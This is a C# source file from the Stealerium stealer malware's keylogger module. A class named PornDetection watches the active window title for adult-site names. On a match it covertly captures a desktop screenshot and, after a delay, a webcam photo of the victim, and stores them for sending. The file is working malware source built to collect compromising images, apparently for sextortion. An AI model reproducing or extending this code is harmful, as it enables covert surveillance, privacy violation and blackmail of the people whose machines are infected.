using System;
using System.IO;
using System.Linq;
using System.Threading;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger
{
    internal sealed class PornDetection
    {
        private static readonly string LogDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\nsfw\\" +
                                 DateTime.Now.ToString("yyyy-MM-dd"));

        // Send desktop and webcam screenshot if active window contains target values
        public static void Action()
        {
            if (Detect()) SavePhotos();
        }

        // Detect target data in active window
        private static bool Detect()
        {
            return Config.PornServices.Any(text => WindowManager.ActiveWindow.ToLower().Contains(text));
        }

        // Save photos
        private static void SavePhotos()
        {
            var logdir = LogDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss");
            if (!Directory.Exists(logdir))
                Directory.CreateDirectory(logdir);

            Thread.Sleep(3000);
            DesktopScreenshot.Make(logdir);
            Thread.Sleep(12000);
            if (Detect()) WebcamScreenshot.Make(logdir);
        }
    }
}